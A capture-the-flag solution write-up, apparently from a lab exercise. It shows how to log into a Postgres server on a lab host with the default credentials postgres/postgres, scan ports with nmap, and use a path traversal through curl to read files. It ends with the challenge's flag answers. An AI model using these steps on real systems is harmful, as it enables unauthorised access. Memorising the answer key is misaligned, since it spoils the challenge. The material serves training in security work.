# Who Let Them Be An Admin? Solution

1. Start openVAS with `openvas-start`
2. Copy the link from the terminal and navigate to it in the web browser
3. Check existing reports, see that 10.10.10.60 has a Postgres database running with the username/password postgres/postgres
4. `psql -h 10.10.10.60 -U postgres` in terminal and enter the password in the prompt.
5. `\l` to list databases, see there is a `prescup` database.
6. `\c prescup` to select the `prescup` database.
7. `\dt` to list tables in the selected database. There is a `flag_tbl` table.
8. `select * from flag_tbl;` gives the first flag.
9. `sudo nmap -p0-65535 10.10.10.61` and see that there is one port open between 40000-45000.
10. `curl 10.10.10.61:43210` (example port - the actual port is chosen at random). Read the returned message and get the flag.
11. `curl 10.10.10.61:43210/browse` gives further instructions to add a `path` query string.
12. `curl 10.10.10.61:43210/browse?path=..` Playing around with the path, we can discover that path traversal is possible, so we use this to list the files up one directory. One of the files in the output is the flag.

### Submission

- Database: `75757526b4fab3d3`
- Server Welcome: `ed949cc48bfaf7c5`
- Server Exploit: `7acaae5511311869`